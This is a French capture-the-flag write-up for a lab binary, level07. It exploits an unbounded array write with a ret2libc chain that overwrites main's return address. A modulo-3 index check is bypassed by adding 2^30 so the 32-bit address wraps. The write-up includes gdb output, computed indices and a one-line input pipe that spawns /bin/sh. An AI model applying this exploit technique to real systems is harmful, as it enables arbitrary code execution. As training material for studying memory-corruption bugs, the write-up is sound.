Dans `store_number`, l'écriture `arr[idx] = num` n'a aucune borne sur
`idx` → écriture à une adresse arbitraire (write-what-where).

On utilise un ret2libc pour écraser l'adresse de retour de `main`.

```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

(gdb) p $ebp
$3 = (void *) 0xffffd628

(gdb) p system
$4 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) find &system, +9999999, "/bin/sh"
0xf7f897ec

Breakpoint 2, 0x08048636 in store_number ()
(gdb) x/wx $ebp+8 
0xffffd440:     0xffffd464
```

L'adresse de retour de `main` est en `ebp+4`, donc
`idx = (ebp+4 - arr) / 4 = 114`. Mais `114 % 3 == 0` → rejeté par le
contrôle `idx % 3 == 0`.

Astuce : l'écriture se fait à :

​```
adresse = arr + idx*4   (mod 2^32)
​```

En ajoutant 2³⁰ (= 0x40000000) à `idx`, le produit `idx*4` augmente
d'exactement 2³², ce qui **n'a aucun effet sur l'adresse 32 bits** (ça
déborde), mais change `idx` → donc change `idx % 3` :

​```
114          %3 = 0   (rejeté)
114 + 2^30   %3 = 1   ✓   (pointe sur la MÊME adresse !)
​```

On écrit donc `ebp+4` avec `idx = 1073741938`, ce qui passe le contrôle.


| Cible | Index | Number (décimal) | Rôle |
|-------|-------|------------------|------|
| ebp+4  | 1073741938 | 4159090384 | `system` (0xf7e6aed0) |
| ebp+8  | 115        | 4159040368 | `exit` (0xf7e5eb70), retour de system |
| ebp+12 | 116        | 4160264172 | `&"/bin/sh"` (0xf7f897ec) |


Séquence d'entrées :
```
store
  Number: 4159090384
  Index:  1073741938
store
  Number: 4159040368
  Index:  115
store
  Number: 4160264172
  Index:  116
quit
```
En une ligne :

```
(python -c 'print "store";print "4159090384";print "1073741938";print "store";print "4159040368";print "115";print "store";print "4160264172";print "116";print "quit"'; cat -) | ./level07
```
